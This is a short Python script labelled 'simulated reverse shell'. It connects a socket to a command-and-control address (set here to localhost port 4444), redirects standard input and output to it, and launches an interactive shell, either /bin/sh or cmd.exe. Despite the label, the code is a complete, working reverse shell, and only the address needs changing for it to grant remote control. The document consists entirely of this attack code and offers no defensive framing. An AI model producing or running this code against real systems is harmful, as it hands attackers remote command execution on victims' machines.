# Simulated reverse shell
import socket, subprocess, os

C2 = ("127.0.0.1", 4444)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(C2)
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"] if os.name != "nt" else ["cmd.exe"])
